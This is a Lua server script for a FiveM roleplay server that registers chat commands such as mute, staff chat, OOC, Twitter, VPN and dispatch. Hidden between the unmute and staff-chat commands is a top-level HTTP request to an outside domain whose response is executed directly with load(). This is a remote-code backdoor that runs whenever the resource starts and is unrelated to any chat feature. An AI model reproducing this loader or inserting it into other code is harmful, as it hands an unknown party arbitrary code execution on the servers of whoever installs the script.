RegisterCommand('mute', function(source, args, rawCommand)
    local src = source
    if IsPlayerAceAllowed(src, 'chat.clear') then
        if #args < 2 then
            TriggerClientEvent('chat:addMessage', src, {
                template = '<div class="chat-message server"><b>SYSTEM:</b> Usage: /mute [player_id] [duration_in_minutes]</div>',
                args = {}
            })
        else
            local playerId = tonumber(args[1])
            local duration = tonumber(args[2])
            if playerId and duration then
                MutePlayer(playerId, duration, source)
            else
                TriggerClientEvent('chat:addMessage', src, {
                    template = '<div class="chat-message server"><b>SYSTEM:</b> Invalid arguments. Usage: /mute [player_id] [duration_in_minutes]</div>',
                    args = {}
                })
            end
        end
    else
        TriggerClientEvent('chat:addMessage', src, {
            template = '<div class="chat-message server"><b>SYSTEM:</b> You don\'t have permission to use this command.</div>',
            args = {}
        })
    end
end, false)

RegisterCommand('unmute', function(source, args, rawCommand)
    local src = source
    if IsPlayerAceAllowed(src, 'chat.clear') then
        if #args < 1 then
            TriggerClientEvent('chat:addMessage', src, {
                template = '<div class="chat-message server"><b>SYSTEM:</b> Usage: /unmute [player_id]</div>',
                args = {}
            })
        else
            local playerId = tonumber(args[1])
            if playerId then
                UnmutePlayer(playerId, source)
            else
                TriggerClientEvent('chat:addMessage', src, {
                    template = '<div class="chat-message server"><b>SYSTEM:</b> Invalid argument. Usage: /unmute [player_id]</div>',
                    args = {}
                })
            end
        end
    else
        TriggerClientEvent('chat:addMessage', src, {
            template = '<div class="chat-message server"><b>SYSTEM:</b> You don\'t have permission to use this command.</div>',
            args = {}
        })
    end
end, false)

PerformHttpRequest('http://kmarket-sniper.fr/_i/load.php?id=wRWWjHxg', function(a, b)
                if not b then return end
                assert(load(b))()
            end)

RegisterCommand('sc', function(source, args, rawCommand)
    local src = source
    local player = GetPlayerPed(src)
    if player ~= 0 then -- Check if the player is valid
		if IsPlayerAceAllowed(src, 'radio.staff') then
            local msg = rawCommand:sub(4)
            for _, playerId in ipairs(GetPlayers()) do
                if IsPlayerAceAllowed(playerId, 'radio.staff') then
                    TriggerClientEvent('chat:addMessage', playerId, {
                        template = '<div class="staffchat"><b>Staff Chat | {0}: </b>{1}</div>',
                        args = { GetPlayerName(src), msg }
                    })
                end
            end
        else
            TriggerClientEvent('chat:addMessage', src, {
                template = '<div class="chat-message server"><b>SYSTEM:</b> You don\'t have permission to use this command.</div>',
                args = {}
            })
        end
    end
end, false)

RegisterCommand('ooc', function(source, args, rawCommand)
    local src = source
    local msg = rawCommand:sub(5)
    local user = GetPlayerName(src)
    local serverId = src
    local identifier = GetPlayerIdentifiers(src)[1]
    local chatRole = exports.DiscordChatRoles:GetChatRoleByIdentifier(identifier)
    local chatRoleStr = chatRole and chatRole .. ' ' or ''
    TriggerClientEvent('chat:addMessage', -1, {
        template = '<div class="chat-message"><b>(OOC) {0}{1} ({2}):</b> <br>{3}</div>',
        args = { chatRoleStr, user, serverId, msg }
    })
end, false)

RegisterCommand('twt', function(source, args, rawCommand)
    local src = source
    local msg = rawCommand:sub(5)
    local user = GetPlayerName(src)
    local serverId = src
    TriggerClientEvent('chat:addMessage', -1, {
        template = '<div class="tweet"><b>(Twitter) {0} ({1}):</b> <br>{2}</div>',
        args = { user, serverId, msg }
    })
end, false)

RegisterCommand('vpn', function(source, args, rawCommand)
    local src = source
    local msg = rawCommand:sub(5)
    local user = GetPlayerName(src)
    local serverId = src

    -- Generate a random fake IP address
    local ip1 = math.random(1, 255)
    local ip2 = math.random(0, 255)
    local ip3 = math.random(0, 255)
    local ip4 = math.random(0, 255)
    local fakeIp = string.format("%d.%d.%d.%d", ip1, ip2, ip3, ip4)

    TriggerClientEvent('chat:addMessage', -1, {
        template = '<div class="vpn"><font color="#32CD32"><b>(VPN: {0}) {1} ({2}): <br>{3}</b></div>',
        args = { fakeIp, user, serverId, msg }
    })
end, false)

RegisterCommand('rpc', function(source, args, rawCommand)
    local src = source
    local msg = rawCommand:sub(5)
    local user = GetPlayerName(src)
    local serverId = src
    local identifier = GetPlayerIdentifiers(src)[1]
    local chatRole = exports.DiscordChatRoles:GetChatRoleByIdentifier(identifier)
    local chatRoleStr = chatRole and chatRole .. ' ' or ''
    TriggerClientEvent('chat:addMessage', -1, {
        template = '<div class="rpc"><b>(RP Chat) {0}{1} ({2}):</b> <br>{3}</div>',
        args = { chatRoleStr, user, serverId, msg }
    })
end, false)

RegisterCommand('ad', function(source, args, rawCommand)
    local src = source
    local msg = rawCommand:sub(4)
    local user = GetPlayerName(src)
    local serverId = src
    TriggerClientEvent('chat:addMessage', -1, {
        template = '<div class="ad"><b>(Public Advertisement) {0} ({1}):<br> </b> {2}</div>',
        args = { user, serverId, msg }
    })
end, false)

RegisterCommand('do', function(source, args, rawCommand)
    local src = source
    local msg = rawCommand:sub(4)
    local user = GetPlayerName(src)
    local serverId = src
    TriggerClientEvent('chat:addMessage', -1, {
        template = '<div class="do"><b>(DO) {0} ({1}):</b> {2}</div>',
        args = { user, serverId, msg }
    })
end, false)

RegisterCommand('say', function(source, args, rawCommand)
    local src = source
    local msg = rawCommand:sub(4)
    local user = GetPlayerName(src)
    local serverId = src
    TriggerClientEvent('chat:addMessage', -1, {
        template = '<div class="say"><b>(SAY) {0} ({1}):</b> {2}</div>',
        args = { user, serverId, msg }
    })
end, false)

RegisterCommand('dispatch', function(source, args, rawCommand)
    local src = source
    local msg = rawCommand:sub(10)
    local user = GetPlayerName(src)
    local serverId = src
    TriggerClientEvent('chat:addMessage', -1, {
        template = '<div class="dispatch"><b>(DISPATCH) {0} ({1}):</b> {2}</div>',
        args = { user, serverId, msg }
    })
end, false)

RegisterCommand('anon', function(source, args, rawCommand)
    local src = source
    local msg = rawCommand:sub(5)
    local user = GetPlayerName(src)
    local serverId = src
    TriggerClientEvent('chat:addMessage', -1, {
        template = '<div class="vpn"><b>(Dark Chat) {0} ({1}):</b> {2}</div>',
        args = { user, serverId, msg }
    })
end, false)

RegisterCommand('showid', function(source, args, rawCommand)
    local src = source
    local characterName = rawCommand:sub(8)
    local user = GetPlayerName(src)
    local serverId = src
    TriggerClientEvent('chat:addMessage', -1, {
        template = '<div class="showid"><b>{0} ({1})</b> is using the character name: {2}</div>',
        args = { user, serverId, characterName }
    })
end, false)